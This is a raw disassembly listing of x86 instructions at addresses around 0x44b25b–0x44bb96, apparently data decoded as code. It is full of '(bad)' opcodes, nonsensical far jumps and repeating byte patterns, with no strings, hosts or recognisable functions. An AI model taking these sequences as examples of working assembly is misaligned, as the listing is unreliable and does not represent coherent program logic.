  44b25b:	shl    DWORD PTR [edi],0xe2
  44b25e:	pop    es
  44b25f:	sbb    esi,0xffffffdd
  44b262:	ins    DWORD PTR es:[edi],dx
  44b263:	or     esp,DWORD PTR [edi]
  44b265:	jmp    0xf62a:0xbaba7401
  44b26c:	arpl   bx,bp
  44b26e:	mov    ebx,0xf7d109e8
  44b273:	jmp    FWORD PTR [edi]
  44b275:	inc    esi
  44b276:	adc    al,BYTE PTR [ecx]
  44b278:	cmp    DWORD PTR [ecx],esp
  44b27a:	jnp    0x44b2c1
  44b27c:	push   edi
  44b27d:	add    BYTE PTR [ebx+0x62c0dc7],bh
  44b283:	add    BYTE PTR ds:0xd084fce9,cl
  44b289:	leave  
  44b28a:	sti    
  44b28b:	mov    cl,0xcd
  44b28d:	out    0x29,eax
  44b28f:	mov    ecx,0x78fce90d
  44b294:	cld    
  44b295:	xor    BYTE PTR ds:0x80654aed,0x7a
  44b29c:	sbb    esp,esi
  44b29e:	push   0x4e
  44b2a0:	and    eax,0x32f8f234
  44b2a5:	sub    DWORD PTR [edx],ebp
  44b2a7:	rol    BYTE PTR [eax],0x0
	...
  44b2c6:	or     eax,0xc87bfce9
  44b2cb:	dec    edi
  44b2cc:	mov    edi,0x75ec27be
  44b2d1:	mov    esi,0x7cfc478e
  44b2d6:	pop    es
  44b2d7:	aam    0x71
  44b2d9:	add    dh,ch
  44b2db:	pop    es
  44b2dc:	repnz clc 
  44b2de:	cli    
  44b2df:	sub    al,BYTE PTR [eax+0x27400f5]
  44b2e5:	call   0xf9298faa
  44b2ea:	into   
  44b2eb:	push   0xffffffe7
  44b2ed:	or     DWORD PTR [eax-0x49],esp
  44b2f0:	jg     0x44b2e8
  44b2f2:	or     eax,0xc47d0853
  44b2f7:	iret   
  44b2f8:	adc    dh,BYTE PTR [di-0x1159]
  44b2fd:	clc    
  44b2fe:	mov    edx,0x2f580aa
  44b303:	xor    al,0xf9
  44b305:	jl     0x44b2ab
  44b307:	iret   
  44b308:	pusha  
  44b309:	add    dh,BYTE PTR [ebp-0x650710a9]
  44b30f:	stos   BYTE PTR es:[edi],al
  44b310:	fistp  DWORD PTR [edi+ebx*4-0x2f7b1b52]
  44b317:	(bad)  
  44b318:	cld    
  44b319:	add    al,0xce
  44b31b:	and    BYTE PTR [esi+0x41],ah
  44b31e:	sbb    BYTE PTR [edx],al
  44b320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b321:	mov    eax,0x920ecc46
  44b326:	imul   ebx,ebp,0x3e6
	...
  44b348:	or     eax,0xd03e700
  44b34d:	add    BYTE PTR [ebx+0x72dd51a1],al
  44b353:	adc    al,0xd
  44b355:	add    bl,al
  44b357:	mov    WORD PTR [ecx-0x23],es
  44b35a:	out    0x3,al
  44b35c:	or     eax,0xd03e700
  44b361:	add    BYTE PTR [ebp+0x1edd2998],dl
  44b367:	pop    ss
  44b368:	or     eax,0x19916300
  44b36d:	fucom  st(6)
  44b36f:	add    ecx,DWORD PTR ds:0xd03e700
  44b375:	add    BYTE PTR [edi-0x65],al
  44b378:	add    ebp,ebx
  44b37a:	out    0x13,al
  44b37c:	or     eax,0xf18c0b00
  44b381:	fsubr  st(6),st
  44b383:	add    ecx,DWORD PTR ds:0xd03e700
  44b389:	add    BYTE PTR [ebx-0x7923264c],bl
  44b38f:	push   ss
  44b390:	or     eax,0xc98c1300
  44b395:	fsubr  st(6),st
  44b397:	add    ecx,DWORD PTR ds:0xd03e700
  44b39d:	add    BYTE PTR [ebp+0x36dcb1b4],al
  44b3a3:	pop    ss
  44b3a4:	or     eax,0xa18d1b00
  44b3a9:	fsubr  st(6),st
  44b3ab:	add    eax,DWORD PTR [eax]
	...
  44b3c9:	add    BYTE PTR ds:0xee90000,cl
  44b3cf:	add    BYTE PTR [eax],al
  44b3d1:	test   eax,0xb9f8dbc1
  44b3d6:	sbb    eax,DWORD PTR [eax]
  44b3d8:	add    ch,ch
  44b3da:	xchg   edx,eax
  44b3db:	(bad)  
  44b3dd:	jmp    0xe944b3f0
  44b3e2:	push   cs
  44b3e3:	add    BYTE PTR [eax],al
  44b3e5:	add    eax,0x71f8db9b
  44b3ea:	cld    
  44b3eb:	(bad)  
  44b3ec:	(bad)  
  44b3ed:	mov    eax,0xe9f8db7c
  44b3f2:	push   cs
  44b3f3:	add    BYTE PTR [eax],al
  44b3f5:	jmp    0xcd44b408
  44b3fa:	sbb    ebx,0xfffffff8
  44b3fd:	test   DWORD PTR [esi],ebx
  44b3ff:	add    BYTE PTR [eax],al
  44b401:	mov    ecx,0xe9f8db9b
  44b406:	push   cs
  44b407:	add    BYTE PTR [eax],al
  44b409:	jmp    0xdf44b41c
  44b40e:	(bad)  
  44b40f:	(bad)  
  44b411:	sbb    eax,0xf500001d
  44b416:	pushf  
  44b417:	fdiv   st(0),st
  44b419:	jmp    0xe944b42c
  44b41e:	push   cs
  44b41f:	add    BYTE PTR [eax],al
  44b421:	sbb    edi,DWORD PTR [edx-0x18e0724]
  44b427:	(bad)  
  44b428:	push   esp
  44b42a:	mov    esp,ebx
  44b42c:	clc    
  44b42d:	jmp    0x44b432
	...
  44b44a:	add    BYTE PTR [eax],al
  44b44c:	push   cs
  44b44d:	add    BYTE PTR [eax],al
  44b44f:	jmp    0xdb44b462
  44b454:	jg     0x44b432
  44b456:	clc    
  44b457:	pop    ecx
  44b458:	or     al,BYTE PTR [eax]
  44b45a:	add    BYTE PTR [ecx-0x1607237f],ch
  44b460:	push   cs
  44b461:	add    BYTE PTR [eax],al
  44b463:	add    BYTE PTR [edi+edi*8-0x71a50001],dh
  44b46a:	sti    
  44b46b:	call   FWORD PTR [eax+0x4fffff4]
  44b471:	mov    ebx,?
  44b473:	push   DWORD PTR [edi+edi*8-0x1]
  44b477:	jmp    DWORD PTR [edi+edi*8-0x1]
  44b47b:	jmp    DWORD PTR [ecx+edx*4]
  44b47e:	sti    
  44b47f:	jmp    FWORD PTR [eax+0x64fffff4]
  44b485:	jno    0x44b482
  44b487:	jmp    DWORD PTR [edi+edi*8-0x1]
  44b48b:	jmp    DWORD PTR [edi+edi*8-0x1]
  44b48f:	call   DWORD PTR [edx]
  44b491:	xchg   ecx,eax
  44b492:	sti    
  44b493:	(bad)  
  44b494:	fdiv   st,st(3)
  44b496:	(bad)  
  44b497:	(bad)  
  44b498:	call   0x2544b029
  44b49d:	(bad)  
  44b49e:	(bad)  
  44b49f:	push   DWORD PTR [edi+edi*8]
  44b4a2:	(bad)  
  44b4a3:	push   DWORD PTR [eax]
  44b4a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b4a6:	sti    
  44b4a7:	call   FWORD PTR [ecx+esi*8-0x1]
  44b4ab:	jmp    DWORD PTR [edi+edi*8]
  44b4ae:	(bad)  
  44b4af:	inc    DWORD PTR [eax]
	...
  44b4cd:	add    ah,dh
  44b4cf:	(bad)  
  44b4d0:	(bad)  
  44b4d1:	push   esp
  44b4d3:	(bad)  
  44b4d4:	(bad)  
  44b4d5:	jmp    esp
  44b4d7:	(bad)  
  44b4d8:	(bad)  
  44b4d9:	jmp    esp
  44b4db:	(bad)  
  44b4dc:	(bad)  
  44b4dd:	dec    DWORD PTR [esi]
  44b4df:	js     0x44b4dc
  44b4e1:	dec    DWORD PTR [edx+0x78]
  44b4e4:	sti    
  44b4e5:	inc    DWORD PTR [edx]
  44b4e7:	js     0x44b4e4
  44b4e9:	(bad)  
  44b4ea:	fdiv   DWORD PTR [edx-0x5]
  44b4ed:	(bad)  
  44b4ee:	jmp    0xfb73:0x16fffb71
  44b4f5:	dec    DWORD PTR [edx]
  44b4f7:	jae    0x44b4f4
  44b4f9:	dec    DWORD PTR ds:0xaafc9129
  44b4ff:	cli    
  44b500:	nop
  44b501:	cld    
  44b502:	mov    ds:0x9afc914c,al
  44b507:	fs xchg edx,eax
  44b509:	cld    
  44b50a:	xchg   edx,eax
  44b50b:	mov    BYTE PTR [ecx-0x6e8f7504],dl
  44b511:	cld    
  44b512:	cmp    BYTE PTR [ecx+edx*4-0x4],0x7a
  44b517:	fcom   DWORD PTR [esi-0x69338d04]
  44b51d:	cld    
  44b51e:	push   0xffffffb4
  44b520:	xchg   esi,eax
  44b521:	cld    
  44b522:	bound  ebp,QWORD PTR [edx]
  44b524:	xchg   esi,eax
  44b525:	cld    
  44b526:	pop    edx
  44b527:	repnz xchg ebp,eax
  44b529:	cld    
  44b52a:	push   edx
  44b52b:	(bad)  
  44b52c:	xchg   ebp,eax
  44b52d:	cld    
  44b52e:	dec    edx
  44b52f:	push   0xfc97
	...
  44b550:	inc    edx
  44b551:	push   esi
  44b552:	xchg   edi,eax
  44b553:	cld    
  44b554:	cmp    cl,BYTE PTR [esi+edx*4-0x68d3cd04]
  44b55b:	cld    
  44b55c:	sub    ch,BYTE PTR [edi+edx*4]
  44b55f:	cld    
  44b560:	and    bl,BYTE PTR [edi+edx*4]
  44b563:	cld    
  44b564:	sbb    bh,BYTE PTR [eax+0xc12fc97]
  44b56a:	xchg   edi,eax
  44b56b:	cld    
  44b56c:	or     ch,ah
  44b56e:	xchg   edi,eax
  44b56f:	cld    
  44b570:	add    dl,BYTE PTR [esi-0x7c050369]
  44b576:	xchg   edi,eax
  44b577:	cld    
  44b578:	bnd jnp 0x44b512
  44b57b:	cld    
  44b57c:	jmp    0xfce7:0xe2fc9861
  44b583:	dec    DWORD PTR ds:0xd2fca923
  44b589:	inc    ebp
  44b58a:	test   eax,0xa963cafc
  44b58f:	cld    
  44b590:	ret    0x5100
  44b593:	mov    al,0xb9
  44b595:	fnstcw WORD PTR [edx]
  44b597:	mov    al,0xb1
  44b599:	fldcw  WORD PTR [edx]
  44b59b:	mov    al,0xa9
  44b59d:	fld    DWORD PTR [eax+esi*4]
  44b5a0:	mov    eax,ds:0x99b0a2d9
  44b5a5:	(bad)  
  44b5a7:	add    ecx,DWORD PTR ds:0x89b31900
  44b5ad:	fst    DWORD PTR [esi+0x24d981b2]
  44b5b3:	mov    bl,0x0
	...
  44b5d1:	add    BYTE PTR [ecx-0x27],bh
  44b5d4:	pop    edx
  44b5d5:	mov    dl,0x71
  44b5d7:	fst    DWORD PTR [esi-0x4e]
  44b5da:	imul   ebx,ecx,0xd961b2d0
  44b5e0:	int3   
  44b5e1:	mov    dl,0x59
  44b5e3:	(bad)  
  44b5e5:	mov    dl,0x51
  44b5e7:	fld1   
  44b5e9:	mov    dl,0x49
  44b5eb:	fldcw  WORD PTR [edx-0x4e]
  44b5ee:	inc    ecx
  44b5ef:	fst    DWORD PTR [esi-0x4e]
  44b5f2:	cmp    ecx,ebx
  44b5f4:	inc    esi
  44b5f5:	mov    dl,0x31
  44b5f7:	fld    DWORD PTR [esi-0x3b26d64e]
  44b5fd:	mov    dl,0x21
  44b5ff:	fldcw  WORD PTR [eax-0x4e]
  44b602:	sbb    ecx,ebx
  44b604:	out    0x3,al
  44b606:	or     eax,0x9aea100
  44b60b:	(bad)  
  44b60d:	add    ecx,DWORD PTR ds:0xf9a4b500
  44b613:	fadd   DWORD PTR [esp+eiz*4-0x5b65270f]
  44b61a:	jmp    0xe1ea0ef7
  44b61f:	fmul   DWORD PTR [edx-0x5b]
  44b622:	(bad)  
  44b624:	cmp    ah,BYTE PTR [ebp+0x20ffd8d1]
  44b62a:	jo     0x44b607
  44b62c:	clc    
  44b62d:	std    
  44b62e:	imul   ebx,ebx,0xdb6ce9f8
  44b634:	clc    
  44b635:	out    dx,eax
	...
  44b652:	add    BYTE PTR [eax],al
  44b654:	ins    BYTE PTR es:[edi],dx
  44b655:	(bad)  
  44b657:	movq   mm3,mm3
  44b65a:	clc    
  44b65b:	movq   mm3,mm3
  44b65e:	clc    
  44b65f:	and    ebp,DWORD PTR [edi-0x25]
  44b662:	clc    
  44b663:	inc    edi
  44b664:	outs   dx,DWORD PTR ds:[esi]
  44b665:	(bad)  
  44b667:	cmp    ebp,DWORD PTR [edi-0x53960725]
  44b66d:	(bad)  
  44b66f:	ja     0x44b61d
  44b671:	(bad)  
  44b673:	jg     0x44b621
  44b675:	(bad)  
  44b677:	push   ecx
  44b678:	lods   al,BYTE PTR ds:[esi]
  44b679:	(bad)  
  44b67b:	lahf   
  44b67c:	lods   al,BYTE PTR ds:[esi]
  44b67d:	(bad)  
  44b67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b680:	lods   al,BYTE PTR ds:[esi]
  44b681:	(bad)  
  44b683:	(bad)  
  44b684:	lods   al,BYTE PTR ds:[esi]
  44b685:	(bad)  
  44b687:	jmp    0xce3d91fb
  44b68c:	outs   dx,DWORD PTR ds:[esi]
  44b68d:	(bad)  
  44b68f:	and    DWORD PTR [esi-0x25],ebp
  44b692:	clc    
  44b693:	mov    ecx,0xc3f8db6f
  44b698:	outs   dx,DWORD PTR ds:[esi]
  44b699:	(bad)  
  44b69b:	outs   dx,DWORD PTR gs:[esi]
  44b69d:	(bad)  
  44b69f:	pop    ebp
  44b6a0:	outs   dx,DWORD PTR ds:[esi]
  44b6a1:	(bad)  
  44b6a3:	test   DWORD PTR [edi-0x25],ebp
  44b6a6:	clc    
  44b6a7:	jae    0x44b658
  44b6a9:	aam    0xf8
  44b6ab:	sbb    ebp,DWORD PTR [edi-0x50f6072c]
  44b6b1:	aam    0xf8
  44b6b3:	sbb    DWORD PTR [edi+0x17f8d4],ebp
	...
  44b6d5:	add    BYTE PTR [edi-0x7d22072c],ch
  44b6db:	aam    0xf8
  44b6dd:	add    ah,al
  44b6df:	ja     0x44b6dc
  44b6e1:	call   DWORD PTR [edx+0x20fffb9c]
  44b6e7:	jge    0x44b6e4
  44b6e9:	call   FWORD PTR [eax+0x62fffb77]
  44b6ef:	mov    al,ds:0xa028fffb
  44b6f4:	sti    
  44b6f5:	jmp    DWORD PTR [eax+eiz*4]
  44b6f8:	sti    
  44b6f9:	push   DWORD PTR [edx]
  44b6fb:	mov    al,ds:0xa014fffb
  44b700:	sti    
  44b701:	jmp    FWORD PTR [eax-0x60]
  44b704:	sti    
  44b705:	jmp    DWORD PTR [eax+eiz*4-0x5fab0005]
  44b70c:	sti    
  44b70d:	call   DWORD PTR [esi+0x6afffba0]
  44b713:	jbe    0x44b710
  44b715:	call   FWORD PTR [esi+0x76]
  44b718:	sti    
  44b719:	inc    DWORD PTR [esi+0x76]
  44b71c:	sti    
  44b71d:	jmp    DWORD PTR [eax]
  44b71f:	ja     0x44b71c
  44b721:	push   eax
  44b723:	jbe    0x44b720
  44b725:	dec    DWORD PTR [edi+esi*2]
  44b728:	sti    
  44b729:	inc    DWORD PTR [esi+0x76]
  44b72c:	sti    
  44b72d:	jmp    DWORD PTR [esi+esi*2+0x76b4fffb]
  44b734:	sti    
  44b735:	call   FWORD PTR [eax+0xfffb77]
	...
  44b757:	add    BYTE PTR [eax+0x77],bh
  44b75a:	sti    
  44b75b:	(bad)  
  44b75c:	fdiv   QWORD PTR [esi-0x5]
  44b75f:	(bad)  
  44b760:	cli    
  44b761:	jbe    0x44b75e
  44b763:	dec    eax
  44b765:	stos   BYTE PTR es:[edi],al
  44b766:	sti    
  44b767:	call   FWORD PTR [edx+ebp*4-0x55570005]
  44b76e:	sti    
  44b76f:	(bad)  
  44b770:	in     al,dx
  44b771:	stos   BYTE PTR es:[edi],al
  44b772:	sti    
  44b773:	dec    DWORD PTR ds:0xe2fca4cb
  44b779:	fsub   DWORD PTR [esp+edi*8-0x3621d26]
  44b780:	shl    BYTE PTR [edx-0x21350363],cl
  44b786:	popf   
  44b787:	cld    
  44b788:	ret    0x9ce4
  44b78b:	cld    
  44b78c:	mov    edx,0xb2fc9cc4
  44b791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b792:	pushf  
  44b793:	cld    
  44b794:	stos   BYTE PTR es:[edi],al
  44b795:	je     0x44b733
  44b797:	cld    
  44b798:	mov    ds:0x9afc9d50,al
  44b79d:	push   0xffffff9d
  44b79f:	cld    
  44b7a0:	xchg   edx,eax
  44b7a1:	cmp    al,0xa4
  44b7a3:	cld    
  44b7a4:	mov    dh,dh
  44b7a6:	mov    ds:0xa42082fc,eax
  44b7ab:	cld    
  44b7ac:	jp     0x44b78e
  44b7ae:	pushf  
  44b7af:	cld    
  44b7b0:	jb     0x44b762
  44b7b2:	pushf  
  44b7b3:	cld    
  44b7b4:	push   0xffffffd4
  44b7b6:	pushf  
  44b7b7:	cld    
  44b7b8:	(bad)  
  44b7b9:	ficomp WORD PTR [esp+edi*8+0x0]
	...
  44b7d8:	add    BYTE PTR [eax],al
  44b7da:	pop    edx
  44b7db:	add    BYTE PTR [ebx-0x7c83ad04],0xfc
  44b7e2:	dec    edx
  44b7e3:	jo     0x44b768
  44b7e5:	cld    
  44b7e6:	inc    edx
  44b7e7:	mov    ds:0x763afc83,al
  44b7ec:	cmp    esp,0x32
  44b7ef:	mov    al,BYTE PTR [ebx-0x7ba5d504]
  44b7f5:	cld    
  44b7f6:	and    al,dh
  44b7f8:	cmp    esp,0x1a
  44b7fb:	xchg   esi,eax
  44b7fc:	cmp    esp,0x12
  44b7ff:	retf   0xfc83
  44b802:	or     bl,BYTE PTR [ebx+eax*4-0x7c1bfd04]
  44b809:	cld    
  44b80a:	cli    
  44b80b:	add    ch,cl
  44b80d:	test   cl,dh
  44b80f:	aad    0xfc
  44b811:	test   cl,ch
  44b813:	aad    0xdc
  44b815:	test   cl,ah
  44b817:	aad    0xc
  44b819:	test   ecx,ebx
  44b81b:	aad    0xbe
  44b81d:	lahf   
  44b81e:	rcl    ebp,1
  44b820:	or     BYTE PTR [ebp-0x7ad72a37],al
  44b826:	rcl    ebp,0x32
  44b829:	test   DWORD PTR [ecx-0x4e7d7b2b],edi
  44b82f:	aad    0x74
  44b831:	sub    BYTE PTR [ecx-0x5e7d9b2b],0xd5
  44b838:	push   eax
  44b839:	sbb    BYTE PTR [ecx+0x8218d5],0x0
	...
  44b85c:	xchg   ecx,eax
  44b85d:	aad    0x22
  44b85f:	or     BYTE PTR [ecx-0x7e7e052b],0xd5
  44b866:	inc    BYTE PTR [ecx-0x7e052a87]
  44b86c:	jno    0x44b843
  44b86e:	loopne 0x44b7f1
  44b870:	imul   edx,ebp,0xd561818e
  44b876:	jle    0x44b7f9
  44b878:	pop    ecx
  44b879:	aad    0xa2
  44b87b:	adc    DWORD PTR [ecx-0x2b],0xd5498196
  44b882:	add    DWORD PTR cs:[ecx-0x2b],0xd539813a
  44b88a:	js     0x44b80d
  44b88c:	xor    ebp,edx
  44b88e:	fadd   QWORD PTR [eax-0x7f3b2ad7]
  44b894:	and    ebp,edx
  44b896:	mov    al,0x80
  44b898:	sbb    ebp,edx
  44b89a:	lods   al,BYTE PTR ds:[esi]
  44b89b:	adc    BYTE PTR [ecx],0xd5
  44b89e:	repnz or BYTE PTR [ecx],0xd5
  44b8a2:	dec    DWORD PTR [edx]
  44b8a4:	mov    ebx,ss
  44b8a6:	clc    
  44b8a7:	fisttp WORD PTR [ebp-0x72e6072d]
  44b8ad:	sar    eax,cl
  44b8af:	or     DWORD PTR [ebp-0x72dc072d],ecx
  44b8b5:	sar    eax,cl
  44b8b7:	push   ecx
  44b8b8:	(bad)  
  44b8b9:	sar    eax,cl
  44b8bb:	push   ebx
  44b8bc:	(bad)  
  44b8bd:	sar    eax,cl
  44b8bf:	arpl   WORD PTR [eax],ax
	...
  44b8dd:	add    BYTE PTR [ebp-0x729c072d],cl
  44b8e3:	sar    eax,cl
  44b8e5:	mov    ch,0x3a
  44b8e7:	aam    0xf8
  44b8e9:	gs (bad) 
  44b8eb:	sar    eax,cl
  44b8ed:	dec    ebp
  44b8ee:	(bad)  
  44b8ef:	sar    eax,cl
  44b8f1:	aas    
  44b8f2:	(bad)  
  44b8f3:	sar    eax,cl
  44b8f5:	daa    
  44b8f6:	(bad)  
  44b8f7:	sar    eax,cl
  44b8f9:	sub    eax,0xe9f8d365
  44b8fe:	push   cs
  44b8ff:	add    BYTE PTR [eax],al
  44b901:	sti    
  44b902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b903:	sar    eax,cl
  44b905:	iret   
  44b906:	xchg   edi,eax
  44b907:	sar    eax,cl
  44b909:	cmc    
  44b90a:	xchg   edi,eax
  44b90b:	sar    eax,cl
  44b90d:	jmp    0xef44b920
  44b912:	push   cs
  44b913:	add    BYTE PTR [eax-0x7ffff11f],al
  44b919:	jmp    0x44b929
  44b91b:	add    BYTE PTR [eax-0x7ffff110],al
  44b921:	jmp    0x5b44b934
  44b926:	mov    eax,ds:0x99e5f8d3
  44b92b:	sar    eax,cl
  44b92d:	rol    DWORD PTR [ecx+0xee9f8d3],1
  44b933:	add    BYTE PTR [eax],al
  44b935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b936:	adc    ebx,0x6b1200f8
  44b93c:	sti    
  44b93d:	(bad)  
  44b93e:	cli    
  44b93f:	(bad)  
  44b940:	(bad)  
  44b941:	jg     0x44b943
	...
  44b95f:	add    BYTE PTR [eax],cl
  44b961:	ins    DWORD PTR es:[edi],dx
  44b962:	sti    
  44b963:	inc    DWORD PTR [esi]
  44b965:	ins    DWORD PTR es:[edi],dx
  44b966:	sti    
  44b967:	push   edx
  44b969:	ins    BYTE PTR es:[edi],dx
  44b96a:	sti    
  44b96b:	(bad)  
  44b96c:	fisubr WORD PTR [ebx+edi*8-0x1]
  44b970:	add    ch,BYTE PTR [edi-0x5]
  44b973:	inc    DWORD PTR [esi]
  44b975:	outs   dx,DWORD PTR ds:[esi]
  44b976:	sti    
  44b977:	push   eax
  44b979:	outs   dx,BYTE PTR ds:[esi]
  44b97a:	sti    
  44b97b:	push   edx
  44b97d:	outs   dx,BYTE PTR ds:[esi]
  44b97e:	sti    
  44b97f:	(bad)  
  44b980:	cld    
  44b981:	outs   dx,BYTE PTR ds:[esi]
  44b982:	sti    
  44b983:	(bad)  
  44b984:	clc    
  44b985:	outs   dx,BYTE PTR ds:[esi]
  44b986:	sti    
  44b987:	dec    DWORD PTR [esp+ebp*2+0x6c36fffb]
  44b98e:	sti    
  44b98f:	inc    DWORD PTR [esp+ebp*2-0x5]
  44b993:	inc    DWORD PTR [esp+ebp*2-0x5]
  44b997:	(bad)  
  44b998:	fisubr DWORD PTR [ebx-0x5]
  44b99b:	inc    DWORD PTR [edx+0x16fffb6f]
  44b9a1:	ins    BYTE PTR es:[edi],dx
  44b9a2:	sti    
  44b9a3:	jmp    DWORD PTR [edx+0x6f]
  44b9a6:	sti    
  44b9a7:	jmp    DWORD PTR [edx+0x6f]
  44b9aa:	sti    
  44b9ab:	inc    DWORD PTR [esi-0x6d00046f]
  44b9b1:	xchg   ecx,eax
  44b9b2:	sti    
  44b9b3:	call   FWORD PTR [esi-0x5f00046f]
  44b9b9:	xchg   ecx,eax
  44b9ba:	sti    
  44b9bb:	(bad)  
  44b9bc:	ficom  DWORD PTR [eax-0xcb0005]
  44b9c2:	(bad)  
  44b9c3:	inc    DWORD PTR [eax]
	...
  44b9e1:	add    dl,bh
  44b9e3:	outs   dx,BYTE PTR ds:[esi]
  44b9e4:	sti    
  44b9e5:	jmp    DWORD PTR [edi+edi*8]
  44b9e8:	(bad)  
  44b9e9:	call   DWORD PTR [eax-0x5a]
  44b9ec:	sti    
  44b9ed:	dec    DWORD PTR ds:0x1afca593
  44b9f3:	fwait
  44b9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b9f5:	cld    
  44b9f6:	adc    al,BYTE PTR [ecx]
  44b9f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b9f9:	cld    
  44b9fa:	or     ch,bh
  44b9fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b9fd:	cld    
  44b9fe:	add    ch,BYTE PTR [edi-0x4d05035b]
  44ba04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ba05:	cld    
  44ba06:	repnz sbb ch,BYTE PTR [esp+edi*8-0x353fd16]
  44ba0e:	loop   0x44ba18
  44ba10:	lods   al,BYTE PTR ds:[esi]
  44ba11:	cld    
  44ba12:	ficomp DWORD PTR [eax]
  44ba14:	lods   al,BYTE PTR ds:[esi]
  44ba15:	cld    
  44ba16:	shl    BYTE PTR [edx],cl
  44ba18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ba19:	cld    
  44ba1a:	retf   0xa52e
  44ba1d:	cld    
  44ba1e:	ret    0xa50c
  44ba21:	cld    
  44ba22:	mov    edx,0xb2fca51e
  44ba27:	xchg   edx,eax
  44ba28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ba29:	cld    
  44ba2a:	stos   BYTE PTR es:[edi],al
  44ba2b:	les    esp,FWORD PTR [ebp-0x5a4d5d04]
  44ba31:	cld    
  44ba32:	call   0xaab2:0x92fcaada
  44ba39:	cld    
  44ba3a:	mov    bh,ah
  44ba3c:	test   eax,0xaad882fc
  44ba41:	cld    
  44ba42:	jp     0x44ba28
  44ba44:	stos   BYTE PTR es:[edi],al
  44ba45:	cld    
	...
  44ba62:	add    BYTE PTR [eax],al
  44ba64:	jb     0x44ba58
  44ba66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ba67:	cld    
  44ba68:	push   0x3e
  44ba6a:	stos   BYTE PTR es:[edi],al
  44ba6b:	cld    
  44ba6c:	bound  eax,QWORD PTR [edx]
  44ba6e:	stos   BYTE PTR es:[edi],al
  44ba6f:	cld    
  44ba70:	pop    edx
  44ba71:	in     al,dx
  44ba72:	test   eax,0xab6452fc
  44ba77:	cld    
  44ba78:	dec    edx
  44ba79:	ss stos DWORD PTR es:[edi],eax
  44ba7b:	cld    
  44ba7c:	inc    edx
  44ba7d:	sub    ch,BYTE PTR [ebx-0x54e7c504]
  44ba83:	cld    
  44ba84:	xor    bh,bh
  44ba86:	lods   eax,DWORD PTR es:[esi]
  44ba88:	sub    edx,edx
  44ba8a:	xor    al,0xad
  44ba8c:	and    edx,edx
  44ba8e:	dec    edx
  44ba8f:	lods   eax,DWORD PTR ds:[esi]
  44ba90:	sbb    edx,edx
  44ba92:	push   eax
  44ba93:	lods   eax,DWORD PTR ds:[esi]
  44ba94:	adc    edx,edx
  44ba96:	in     al,dx
  44ba97:	lods   al,BYTE PTR ds:[esi]
  44ba98:	or     edx,edx
  44ba9a:	fisubr WORD PTR [ecx+eax*1-0x650b12e]
  44baa1:	rcr    DWORD PTR [esi-0x51],1
  44baa4:	icebp  
  44baa5:	rcr    DWORD PTR [edx-0x7f2e1651],1
  44baab:	scas   eax,DWORD PTR es:[edi]
  44baac:	loope  0x44ba7f
  44baae:	mov    ah,0xaf
  44bab0:	(bad)  
  44bab2:	sahf   
  44bab3:	scas   eax,DWORD PTR es:[edi]
  44bab4:	rcl    ecx,1
  44bab6:	mov    eax,0xc4d1c9af
  44babb:	scas   eax,DWORD PTR es:[edi]
  44babc:	rcl    ecx,0xdc
  44babf:	scas   eax,DWORD PTR es:[edi]
  44bac0:	mov    ecx,0xb1ad9cd1
  44bac5:	shl    DWORD PTR [ebp+ebp*4+0x0],1
	...
  44bae5:	add    BYTE PTR [ecx-0x5e54232f],ch
  44baeb:	sar    DWORD PTR [ebx+ebp*4-0x544f2e67],1
  44baf2:	xchg   ecx,eax
  44baf3:	shr    DWORD PTR [edx-0x432e7655],1
  44baf9:	test   eax,0xa5e0d181
  44bafe:	jns    0x44bad1
  44bb00:	enter  0x71a5,0xd1
  44bb04:	aam    0xa5
  44bb06:	imul   edx,ecx,0xd161a628
  44bb0c:	add    al,0xa6
  44bb0e:	pop    ecx
  44bb0f:	rcl    DWORD PTR [eax],1
  44bb11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bb12:	push   ecx
  44bb13:	shr    DWORD PTR [edx-0x5a],1
  44bb16:	dec    ecx
  44bb17:	rcl    DWORD PTR [esi+eiz*4+0x41],1
  44bb1b:	sar    edi,1
  44bb1d:	dec    eax
  44bb1e:	jae    0x44baf4
  44bb20:	clc    
  44bb21:	stos   DWORD PTR es:[edi],eax
  44bb22:	popa   
  44bb23:	aam    0xf8
  44bb25:	fwait
  44bb26:	jns    0x44bafc
  44bb28:	clc    
  44bb29:	mov    esi,DWORD PTR [ecx-0x2c]
  44bb2c:	clc    
  44bb2d:	jnp    0x44bb98
  44bb2f:	aam    0xf8
  44bb31:	addr16 popa 
  44bb33:	aam    0xf8
  44bb35:	mov    ebp,0xc5f8d3b6
  44bb3a:	mov    dh,0xd3
  44bb3c:	clc    
  44bb3d:	fwait
  44bb3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bb3f:	sar    eax,cl
  44bb41:	stos   DWORD PTR es:[edi],eax
  44bb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44bb43:	sar    eax,cl
  44bb45:	iret   
  44bb46:	mov    dh,0xd3
  44bb48:	clc    
  44bb49:	add    DWORD PTR [eax],eax
	...
  44bb67:	add    BYTE PTR [ecx-0x591e072d],dh
  44bb6d:	sar    eax,cl
  44bb6f:	adc    ebp,DWORD PTR [edx+0x7211f8d3]
  44bb75:	sar    eax,cl
  44bb77:	or     DWORD PTR [edx-0x2d],ebp
  44bb7a:	clc    
  44bb7b:	daa    
  44bb7c:	jb     0x44bb51
  44bb7e:	clc    
  44bb7f:	sub    ebp,DWORD PTR [edx-0x2d]
  44bb82:	clc    
  44bb83:	cdq    
  44bb84:	jae    0x44bb59
  44bb86:	clc    
  44bb87:	mov    ebx,0xcff8d368
  44bb8c:	jo     0x44bb61
  44bb8e:	clc    
  44bb8f:	xchg   ebx,eax
  44bb90:	addr16 sar eax,cl
  44bb93:	xchg   ecx,eax
  44bb94:	mov    bh,0xd3
  44bb96:	clc    
